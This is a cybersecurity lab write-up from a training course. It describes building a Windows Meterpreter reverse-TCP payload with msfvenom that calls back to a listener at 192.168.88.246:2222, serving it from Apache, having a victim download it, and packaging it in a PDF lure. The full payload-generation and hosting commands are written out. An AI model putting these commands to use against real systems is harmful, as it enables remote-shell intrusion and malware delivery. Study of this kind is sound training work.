# Meterpreter Payload Delivery Workflow

> **Controlled Cybersecurity Lab Write-Up**
>
> A technical record of a Windows Meterpreter reverse-TCP payload delivery workflow performed in an isolated educational environment.

![Security Assessment](https://img.shields.io/badge/Focus-Security%20Assessment-111827?style=for-the-badge)
![Environment](https://img.shields.io/badge/Environment-Controlled%20Lab-0f766e?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Windows%20%2B%20Linux-2563eb?style=for-the-badge)

---

## Overview

This write-up documents a controlled-lab workflow involving the preparation and delivery of a **Windows Meterpreter reverse-TCP payload**.

The practical covers four main stages:

```text
Payload Generation
        ↓
Apache Web Hosting
        ↓
Victim-Side Retrieval
        ↓
PDF Artifact Preparation
```

The available source material confirms these workflow stages. It does **not** provide evidence of a completed exploitation or Meterpreter session, and it does not document the exact mechanism used to embed the payload into the PDF.

## Objective

Document the laboratory procedure used to:

- Generate a Windows Meterpreter reverse-TCP payload.
- Host the generated executable through Apache2.
- Retrieve the payload from the victim machine.
- Incorporate the payload into a PDF-based delivery artifact.
- Preserve the available evidence without adding undocumented implementation details.

## Lab Environment

| Component | Details |
|---|---|
| **Assessment Type** | Controlled educational lab practical |
| **Payload Host** | `192.168.88.246` |
| **Payload Type** | Windows Meterpreter reverse TCP |
| **Payload File** | `payload.exe` |
| **Server Component** | Apache2 |
| **Setting** | Educational / Controlled Lab Environment |
| **Training Context** | NAVTTC-funded cybersecurity training, Corvit Institute, Rawalpindi |

## Tools Used

`msfvenom` · `Meterpreter` · `Apache2` · `PDF artifact preparation`

## Methodology & Results

| **#** | **Stage** | **Command / Action** | **Result / Finding** |
|---:|---|---|---|
| 1 | Payload generation | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.246 LPORT=2222 -f exe -o payload.exe` | Windows Meterpreter reverse-TCP payload generated as `payload.exe`. |
| 2 | Payload hosting | `mv payload.exe /var/www/html` | Generated payload moved to the Apache web root. |
| 3 | Web server startup | `service apache2 start` | Apache2 service started for payload hosting. |
| 4 | Service verification | `service apache2 status` | Apache2 status checked after startup. |
| 5 | Victim-side delivery | Payload downloaded on the victim machine | The source material confirms the download, but does not specify the exact URL, browser, timestamp, or download method. |
| 6 | PDF artifact preparation | Payload incorporated into a PDF-based artifact | The source states that the payload was injected into the PDF, but the exact embedding mechanism is not documented. |
| 7 | Final PDF creation | PDF images and icon added; final PDF created | A final PDF-based delivery artifact was produced according to the submitted material. |
| 8 | Exploitation/session result | Not documented | No final exploitation or Meterpreter session result is evidenced in the source material. |

## Workflow at a Glance

| Stage | Purpose | Status |
|---|---|---|
| **01 · Generate** | Create the reverse-TCP executable | ✅ Documented |
| **02 · Host** | Place `payload.exe` in Apache web root | ✅ Documented |
| **03 · Serve** | Start and verify Apache2 | ✅ Documented |
| **04 · Deliver** | Retrieve payload on victim machine | ✅ Documented |
| **05 · Package** | Prepare the PDF-based artifact | ✅ Documented |
| **06 · Session** | Confirm a successful Meterpreter session | ⚠️ Not documented |

## Key Findings

- The exercise demonstrates a **malware-delivery workflow** spanning payload generation, web hosting, victim-side retrieval, and PDF artifact preparation.
- The payload was configured as a **Windows Meterpreter reverse-TCP** executable using `192.168.88.246` as the listener host and TCP port `2222`.
- **Apache2** served as the web-hosting component for `payload.exe`.
- The source confirms that the generated payload was downloaded on the victim machine.
- The source confirms PDF-based payload incorporation, but the **exact embedding technique is not documented**.
- A completed exploitation or Meterpreter session is **not evidenced** in the submitted material.

## Security Impact

In an unauthorized environment, a workflow of this type could facilitate malware delivery and potentially provide remote access to a compromised host.

Within the submitted context, the activity is described as an **educational practical in a controlled laboratory environment**, and no unauthorized production target is identified.

## Recommendations

- Do not execute unknown or untrusted executable content.
- Use endpoint protection and application controls to detect and block suspicious payloads.
- Restrict unnecessary outbound connections from endpoints.
- Inspect suspicious PDF attachments and downloaded executables in a controlled sandbox.
- Maintain security awareness and attachment-handling procedures.
- Perform malware-delivery testing only in authorized, isolated environments.

## What I Learned

This practical demonstrated how multiple stages of a delivery workflow connect together: **payload generation → web hosting → victim-side retrieval → document preparation**.

It also reinforced the importance of collecting clear technical evidence at every stage and separating documented observations from details that are not present in the source material.

## Environment Disclaimer

All activity described in this write-up is framed as an **educational / controlled laboratory exercise**. The report is based solely on the submitted practical material. No claim of testing against an unauthorized production system is made.

## Evidence

The submitted PDF contains the visual evidence associated with the workflow, including source pages covering payload generation, hosting, delivery, and PDF artifact preparation.

**Full Report:** [meterpreter-payload-delivery-workflow.pdf](meterpreter-payload-delivery-workflow.pdf)

---

> **Repository Note:** This write-up is intended for authorized cybersecurity training, documentation, and controlled laboratory use only.
